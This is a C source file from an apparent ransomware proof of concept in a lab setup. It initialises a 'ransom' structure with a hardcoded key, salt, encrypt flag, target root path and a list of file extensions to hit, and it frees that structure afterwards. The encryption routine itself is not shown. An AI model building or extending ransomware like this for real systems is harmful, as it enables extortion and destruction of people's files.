#include "fournights.h"

/**
  * init_struct - la
  * @ransom: la
  * Return: la
 **/
ransom_t *init_struct(ransom_t *ransom)
{
	char *file_exts = "/home/vagrant/FourNights/c_poc/file_exts.txt";
	unsigned int salt[] = {12345, 54321};
#ifndef NO_DEBUG
	int i = 0;

	printf("Entering init_struct\n");
#endif

	ransom->target_file_buf = malloc(sizeof(target_file_t));
	/**
	  * build target_file_s part of ransom struct
	  * by allocating space for temporary buffers
	 **/
	ransom->target_file_buf->filepath = my_calloc(PATH_MAX, sizeof(char));
	ransom->target_file_buf->buf = my_calloc(BIGBUF * sizeof(char), sizeof(char));
	/* init file_offset and bytes_read */
	ransom->target_file_buf->file_offset = 0;
	ransom->target_file_buf->bytes_read = 0;

	ransom->key = "Holberton";
	ransom->salt = salt;
	ransom->cipher_flag = 'e'; /* set cipher_flag to encrypt */
	ransom->root_path = "/home/vagrant/FourNights/TESTS/";
	lstat(file_exts, &(ransom->target_file_buf->file_info));
	if(read_file(file_exts, ransom, tokenizer) < 1)
	{
#ifndef NO_DEBUG
		fprintf(stderr, "No Bytes read\n");
#endif
		return(NULL);
	}
	/* reset file_offset and bytes_read */
	ransom->target_file_buf->file_offset = 0;
	ransom->target_file_buf->bytes_read = 0;

	/* Struct Built. */
#ifndef NO_DEBUG
	printf("root_path: %s\n", ransom->root_path);
	for (i = 0; ransom->file_extensions[i]; i++)
		printf("%s%s", i ? ", " : "", ransom->file_extensions[i]);
	printf("\nKey: %s\n", ransom->key);
	printf("salt: %lu\n", (unsigned long)&(ransom->salt));
	printf("Exiting init_struct function\n");
#endif
	return(ransom);
}

/**
  * free_ransom_struct - Frees all malloced space in the struct
  * @ransom: struct to free
 **/
void free_ransom_struct(ransom_t *ransom)
{
	free(ransom->target_file_buf->buf);
	ransom->target_file_buf->buf = NULL;
	free(ransom->target_file_buf->filepath);
	ransom->target_file_buf->filepath = NULL;
	free(ransom->target_file_buf);
	ransom->target_file_buf = NULL;

	ransom->root_path = NULL;
	free(ransom->file_exts_whole_str);
	ransom->file_exts_whole_str = NULL;
	free(ransom->file_extensions);
	ransom->file_extensions = NULL;
	ransom = NULL;
}
